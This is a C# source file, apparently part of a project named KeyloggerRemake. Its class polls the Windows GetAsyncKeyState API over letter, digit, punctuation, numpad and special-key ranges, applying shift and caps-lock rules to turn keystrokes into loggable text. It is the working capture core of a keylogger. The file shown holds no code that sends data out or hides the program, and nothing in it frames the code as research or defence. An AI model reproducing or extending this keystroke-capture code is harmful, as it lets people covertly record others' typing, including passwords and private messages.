using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KeyloggerRemake
{
    public class classGetKeys
    {
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey); //Only used for shift key for less confusion

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey); //Used to get all pressed keys

        //Checks if shift is held
        private static bool getShift()
        {
            if (GetAsyncKeyState(Keys.ShiftKey) != 0) //If it is
            {
                return true;
            }
            else //If it isn't
            {
                return false;
            }
        }

        //Checks if capslock is on
        private static bool getCapsLock()
        {
            bool capsLock;
            capsLock = Console.CapsLock; //True if it is, false if it isn't

            return capsLock;
        }

        //Checks if a key in the alphabet is pressed
        public static string checkAlphabet()
        {
            string strKey = "";

            //From ASCII 65 to 90
            for (int i = 65; i <= 90; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    strKey = Convert.ToChar(i).ToString();
                    if (getCapsLock() == true) //If caps is pressed
                    {
                        if (getShift() == false) //But shift isn't held
                        {
                            strKey = strKey.ToUpper();
                        }
                        else //But shift isn't held
                        {
                            strKey = strKey.ToLower();
                        }
                    }
                    else //If caps isn't pressed
                    {
                        if (getShift() == true) //But shift is held
                        {
                            strKey = strKey.ToUpper();
                        }
                        else //But shift isn't held
                        {
                            strKey = strKey.ToLower();
                        }
                    }
                }
            }

            return strKey;
        }

        //Checks if some important extra keys are pressed
        public static string checkExtraKeys()
        {
            string strKey = "";

            //From ASCII 0 to 47
            for (int i = 0; i <= 47; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    switch (i)
                    {
                        case 8:
                            strKey = "[BS] ";
                            break;
                        case 9:
                            strKey = "[Tab] ";
                            break;
                        case 13:
                            strKey = Environment.NewLine;
                            break;
                        case 17:
                            strKey = "[Control] ";
                            break;
                        case 18:
                            strKey = "[Alt] ";
                            break;
                        case 19:
                            strKey = "[Pause] ";
                            break;
                        case 27:
                            strKey = "[Esc] ";
                            break;
                        case 32:
                            strKey = " ";
                            break;
                        case 33:
                            strKey = "[PgUp] ";
                            break;
                        case 34:
                            strKey = "[PgDown] ";
                            break;
                        case 35:
                            strKey = "[End] ";
                            break;
                        case 36:
                            strKey = "[Home] ";
                            break;
                        case 44:
                            strKey = "[PrntSc] ";
                            break;
                        case 45:
                            strKey = "[Ins] ";
                            break;
                    }
                }
            }

            return strKey;
        }

        //Checks if some more extra keys are pressed
        public static string checkMoreExtraKeys()
        {
            string strKey = "";

            //From ASCII 112 to 256
            for (int i = 112; i <= 256; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    if (getShift() == false)
                    {
                        switch (i)
                        {
                            case 144:
                                strKey = "[NumLock] ";
                                break;
                            case 145:
                                strKey = "[ScrollLock] ";
                                break;
                            case 186:
                                strKey = ";";
                                break;
                            case 187:
                                strKey = "=";
                                break;
                            case 188:
                                strKey = ",";
                                break;
                            case 189:
                                strKey = "-";
                                break;
                            case 190:
                                strKey = ".";
                                break;
                            case 191:
                                strKey = "/";
                                break;
                            case 192:
                                strKey = "`";
                                break;
                            case 219:
                                strKey = "[";
                                break;
                            case 220:
                                strKey = "'\'";
                                break;
                            case 221:
                                strKey = "]";
                                break;
                            case 222:
                                strKey = "'";
                                break;
                            case 223:
                                strKey = "`";
                                break;
                            case 255:
                                strKey = "[DEL]";
                                break;
                        }
                    }
                    else
                    {
                        switch (i)
                        {
                            case 186:
                                strKey = ":";
                                break;
                            case 187:
                                strKey = "+";
                                break;
                            case 188:
                                strKey = "<";
                                break;
                            case 189:
                                strKey = "_";
                                break;
                            case 190:
                                strKey = ">";
                                break;
                            case 191:
                                strKey = "?";
                                break;
                            case 192:
                                strKey = "~";
                                break;
                            case 219:
                                strKey = "{";
                                break;
                            case 220:
                                strKey = "|";
                                break;
                            case 221:
                                strKey = "}";
                                break;
                        }
                    }
                }
            }

            return strKey;
        }

        //Checks if any numbers are pressed, or if the keys above are pressed
        public static string checkNumbersAndAbove()
        {
            string strKey = "";

            //From ASCII 48 to 57
            for (int i = 48; i <= 57; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    if (getShift() == true) //If shift is held
                    {
                        switch (Convert.ToChar(i).ToString())
                        {
                            //Gets the character above the key pressed
                            case "1":
                                strKey = "!";
                                break;
                            case "2":
                                strKey = "@";
                                break;
                            case "3":
                                strKey = "#";
                                break;
                            case "4":
                                strKey = "$";
                                break;
                            case "5":
                                strKey = "%";
                                break;
                            case "6":
                                strKey = "^";
                                break;
                            case "7":
                                strKey = "&";
                                break;
                            case "8":
                                strKey = "*";
                                break;
                            case "9":
                                strKey = "(";
                                break;
                            case "0":
                                strKey = ")";
                                break;
                        }
                    }
                    else //If shift isn't held
                    {
                        strKey = Convert.ToChar(i).ToString(); //Gets the normal numbers
                    }
                }
            }

            return strKey;
        }

        //Checks if the numpad is used
        public static string checkNumpad()
        {
            string strKey = "";

            //From ASCII 96 to 120
            for (int i = 96; i <= 120; i++)
            {
                int keyPressed = GetAsyncKeyState(i);
                if (keyPressed == -32767)
                {
                    switch (i)
                    {
                        case 96:
                            strKey = "0";
                            break;
                        case 97:
                            strKey = "1";
                            break;
                        case 98:
                            strKey = "2";
                            break;
                        case 99:
                            strKey = "3";
                            break;
                        case 100:
                            strKey = "4";
                            break;
                        case 101:
                            strKey = "5";
                            break;
                        case 102:
                            strKey = "6";
                            break;
                        case 103:
                            strKey = "7";
                            break;
                        case 104:
                            strKey = "8";
                            break;
                        case 105:
                            strKey = "9";
                            break;
                        case 106:
                            strKey = "*";
                            break;
                        case 107:
                            strKey = "+";
                            break;
                        case 109:
                            strKey = "-";
                            break;
                        case 110:
                            strKey = ".";
                            break;
                        case 111:
                            strKey = "/";
                            break;
                    }
                }
            }

            return strKey;
        }

        private void testLogger() //NOT USED - Efficient... but, ineffective.
        {
            while (true)
            {
                for (Int32 i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state == 1 || state == -32767)
                    {
                        //addToLog(Convert.ToChar((Keys)i).ToString());
                    }
                }
            }
        }
    }
}
